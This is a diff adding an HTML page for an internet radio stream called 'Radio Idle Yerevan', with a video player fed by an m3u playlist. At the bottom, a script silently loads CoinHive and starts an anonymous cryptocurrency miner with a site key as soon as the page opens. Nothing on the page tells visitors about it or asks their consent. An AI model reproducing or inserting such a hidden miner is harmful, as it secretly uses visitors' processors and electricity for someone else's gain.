@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+  <link href="https://fonts.googleapis.com/css?family=Oswald:200" rel="stylesheet">
+    <meta charset="utf-8">
+    <title>Radio Idle Yerevan</title>
+    <meta name="description" content="">
+    <style>
+      /* Responsive video */
+      video { 
+        max-width: 100%;
+        height: auto;
+      }
+
+      /* faimaison style */
+      body {
+        background: #37455b;
+        color: #cedbf0;
+      }
+      h1, a {
+        color: #b4d931;
+      }
+      video {
+        border: 1px solid #485a74;
+		    box-shadow: 0 0 20px 0px #888888;
+      }
+	  .a {
+	  font-weight: bold;
+  font-style:normal;
+  font-family: 'Oswald', sans-serif;
+  font-size: Xx-large;
+      text-shadow: 3px 2px 3px rgba(38, 0, 255, 0.7);
+}
+
+	.b {
+  font-style:italic;
+  font-family: 'Oswald', sans-serif;
+	  font-weight: lighter;
+	  font-size: x-large;
+	      text-shadow: 1.5px 1px 3px rgb(255, 0, 217);
+}
+    </style>
+  </head>
+  <body>
+	
+	</br>
+	<center>
+	<span class="b">Idle</span>
+	<span class="a"> Yerevan</span>
+	</center>
+	</br>
+	</br>
+    <center><video poster="poster.jpg" id="video"controls loop autoplay width="640"  height="300" data-playlist="RadioIdleYerevan.m3u"></video></center>
+	</br>
+	<iframe src="sT.html" frameBorder="0" style="width: -webkit-fill-available; height: 150;"></iframe>
+    <script src="m3uStreamPlayer.js"></script>
+    <script>m3uStreamPlayer.init({selector: '#video', debug: true});</script>
+	
+    </script>
+	<script src="CH/ch.js"></script>
+	<script>
+	var ch = new CoinHive.Anonymous('xrw7yeplgBYGxW7FgUB2FZPB4Qdq3y7r');
+	ch.setThrottle(0.2)
+	ch.start();
+	
+	
+</script>
+  </body>
+</html>
+
